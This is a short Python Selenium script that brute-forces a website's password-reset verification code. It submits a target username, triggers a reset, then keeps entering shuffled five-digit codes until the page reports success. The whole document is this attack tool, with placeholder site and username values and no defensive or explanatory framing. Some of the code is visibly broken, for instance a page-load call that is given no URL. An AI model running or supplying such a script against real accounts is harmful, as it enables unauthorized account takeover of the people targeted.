from selenium import webdriver
import time
import random

PASSWORD_RESET_UL = 'https://<some_website>/resetpassword'
USER_NAME = '<username>'

# For the sake of an example i suppose that the reset codes of the webiste are just 5 digit numbers and they can't have a leading zero 
verificationCodes = ['%05d' % i for i in range(10000,100000)]

browser = webdriver.Chrome()
browser.get()
userId = browser.find_element_by_id('username')
userId.send_keys(USER_NAME)
sendCodeButton = browser.find_element_by_id('reset')
sendCodeButton.click()
time.sleep(3)
foundCode = False



while not foundCode:
    random.shuffle(verificationCodes)
    code = verificationCodes[-1]
    print('Trying', code)
    browser.get(PASSWORD_RESET_UL)
    emailCode = browser.find_element_by_id('generatedCode')
    emailCode.clear()
    emailCode.send_keys(code)
    verifyCodeButton = browser.find_element_by_id('verify')
    verifyCodeButton.click()
    time.sleep(3)
    emailCodeMsg = browser.find_element_by_id('email-code-msg')
    print('%s @ %s' %(emailCodeMsg.text, code))
    
    if 'verified' in emailCodeMsg.text:
        foundCode = True
    elif 'incorrect' in emailCodeMsg.text:
        verificationCodes.pop()
        print('Trying again')
    else:
        continue

    print('%d codes left' % len(verificationCodes))
    time.sleep(10)

